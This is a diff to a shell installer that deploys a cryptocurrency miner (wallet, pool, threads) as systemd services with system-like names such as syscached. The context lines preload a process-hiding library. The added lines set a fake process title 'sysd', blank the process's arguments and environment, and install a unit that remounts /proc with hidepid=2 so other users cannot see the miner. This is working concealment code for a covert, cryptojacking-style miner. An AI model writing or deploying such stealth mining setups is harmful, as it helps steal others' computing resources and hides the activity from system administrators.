@@ -81,6 +81,9 @@ CONN_POOL=${POOL}
 WALLET=${WALLET}
 WORKER=${W}
 THREADS=${THREADS}
+# Nama proses di ps + argv/env dikosongkan; hanya berlaku pada build
+# ENABLE_SELF_DEFENSE=ON, diabaikan oleh build biasa.
+XCB_TITLE=sysd
 ENV
 $SUDO install -m 600 "$tmp_env" /etc/xcb/miner.env
 rm -f "$tmp_env"
@@ -96,8 +99,30 @@ Wants=syscache-hugepages.service
 Environment=LD_PRELOAD=/usr/local/lib/hideproc.so
 UNIT
 
+# hidepid=2: non-root tidak melihat proses user lain di /proc, termasuk miner.
+$SUDO tee /etc/systemd/system/xcb-proc-hidepid.service >/dev/null <<'UNIT'
+[Unit]
+Description=Hide other users' processes in /proc
+DefaultDependencies=no
+After=local-fs.target
+Before=syscached.service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/mount -o remount,hidepid=2 /proc
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+UNIT
+$SUDO tee /etc/systemd/system/syscached.service.d/10-hidepid.conf >/dev/null <<'UNIT'
+[Unit]
+Wants=xcb-proc-hidepid.service
+After=xcb-proc-hidepid.service
+UNIT
+
 $SUDO systemctl daemon-reload
-$SUDO systemctl enable --now syscache-hugepages.service syscached.service
+$SUDO systemctl enable --now xcb-proc-hidepid.service syscache-hugepages.service syscached.service
 sleep 8
 
 echo "== cek library =="
